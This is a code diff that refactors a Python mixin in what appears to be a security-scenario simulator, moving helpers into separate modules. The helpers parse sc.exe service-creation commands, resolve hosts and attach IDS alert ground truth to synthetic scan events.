-    if not command_line:
-        return None
-    match = re.search(
-        r'\bsc(?:\.exe)?\s+create\s+(\S+)\s+binpath=\s*"?([^"]+)"?',
-        command_line,
-        flags=re.IGNORECASE,
-    )
-    if match is None:
-        return None
-    service_name = match.group(1)
-    service_start_type = "3"
-    start_match = re.search(
-        r"\bstart=\s*(delayed-auto|auto|demand|disabled|boot|system)\b",
-        command_line,
-        flags=re.IGNORECASE,
-    )
-    if start_match is not None:
-        service_start_type = {
-            "boot": "0",
-            "system": "1",
-            "auto": "2",
-            "delayed-auto": "2",
-            "demand": "3",
-            "disabled": "4",
-        }[start_match.group(1).lower()]
-    return service_name, service_start_type
-
 
 class StorylineMixin:
     """Mixin providing storyline event scheduling and execution methods."""
@@ -1552,8 +720,8 @@ class StorylineMixin:
     def _resolve_scenario_network_host(self, host: str, *, src_host: str = "") -> str | None:
         """Resolve a scenario-authored host through network identities first."""
 
-        if not host or _IPV4_LITERAL_RE.fullmatch(host):
-            return host if _IPV4_LITERAL_RE.fullmatch(host or "") else None
+        if not host or process_helpers._IPV4_LITERAL_RE.fullmatch(host):
+            return host if process_helpers._IPV4_LITERAL_RE.fullmatch(host or "") else None
         resolver = getattr(self, "network_resolver", None)
         if resolver is not None:
             resolved = resolver.resolve_host(host, src_host=src_host)
@@ -2126,7 +1294,7 @@ class StorylineMixin:
         command_line: str,
     ) -> None:
         """Remember an sc.exe create command so the later 4697 fields match it."""
-        parsed = _extract_sc_create_service_start_type(command_line)
+        parsed = process_helpers._extract_sc_create_service_start_type(command_line)
         if parsed is None:
             return
         service_name, service_start_type = parsed
@@ -4614,7 +3782,7 @@ class StorylineMixin:
             jitter_offset = rng.uniform(-spacing * 0.45, spacing * 0.55)
             scan_time = time + timedelta(seconds=total_count * spacing + jitter_offset)
             self.state_manager.set_current_time(scan_time)
-            authored_ids_alerts = _build_ids_alert_contexts(
+            authored_ids_alerts = ids_helpers._build_ids_alert_contexts(
                 getattr(spec, "ids_alerts", []),
                 time=scan_time,
                 src_ip=scan_src_ip,
@@ -4700,7 +3868,9 @@ class StorylineMixin:
         malicious_event["total_connections"] = total_count
         malicious_event["protocol"] = spec.protocol
         if getattr(spec, "ids_alerts", []):
-            malicious_event["ids_alerts"] = _ids_attachment_ground_truth(spec.ids_alerts)
+            malicious_event["ids_alerts"] = ids_helpers._ids_attachment_ground_truth(
+                spec.ids_alerts
+            )
         return malicious_event
 
     def _execute_web_scan_bundle(self, request: WebScanRequest) -> dict[str, Any]:
@@ -4814,7 +3984,7 @@ class StorylineMixin:
             return path_sequence.pop()
 
         pause_until: datetime | None = None
-        for tick_time in _iter_periodic_ticks(
+        for tick_time in periodic_helpers._iter_periodic_ticks(
             start,
             interval_sec,
             duration_sec,
@@ -4982,7 +4152,7 @@ class StorylineMixin:
                 rng, is_tls=is_tls
             )
             http_for_conn = http_ctx if conn_state == "SF" else None
-            authored_ids_alerts = _build_ids_alert_contexts(
+            authored_ids_alerts = ids_helpers._build_ids_alert_contexts(
                 getattr(spec, "ids_alerts", []),
                 time=tick_time,
                 src_ip=scan_src_ip,
@@ -5020,7 +4190,9 @@ class StorylineMixin:
         malicious_event["preset"] = spec.preset
         malicious_event["request_count"] = request_count
         if getattr(spec, "ids_alerts", []):
-            malicious_event["ids_alerts"] = _ids_attachment_ground_truth(spec.ids_alerts)
+            malicious_event["ids_alerts"] = ids_helpers._ids_attachment_ground_truth(
+                spec.ids_alerts
+            )
         return malicious_event
 
     def _resolve_firewall_interface(self, ip: str) -> str:
@@ -5374,7 +4546,7 @@ class StorylineMixin:
     def _resolve_storyline_network_target(self, target: str) -> str | None:
         """Resolve a storyline command target host/IP to an environment IP when possible."""
         lowered = target.rstrip(".").lower()
-        if _IPV4_LITERAL_RE.fullmatch(lowered):
+        if process_helpers._IPV4_LITERAL_RE.fullmatch(lowered):
             return target
         ad_domain = getattr(self, "_ad_domain", "")
         for system in self.scenario.environment.systems:
@@ -5429,7 +4601,11 @@ class StorylineMixin:
         ip: Any,
     ) -> None:
         """Record the first valid authored IP for a normalized storyline hostname."""
-        if not hostname or not isinstance(ip, str) or not _IPV4_LITERAL_RE.fullmatch(ip):
+        if (
+            not hostname
+            or not isinstance(ip, str)
+            or not process_helpers._IPV4_LITERAL_RE.fullmatch(ip)
+        ):
             return
         lowered = str(hostname).rstrip(".").lower()
         authored_ips.setdefault(lowered, ip)
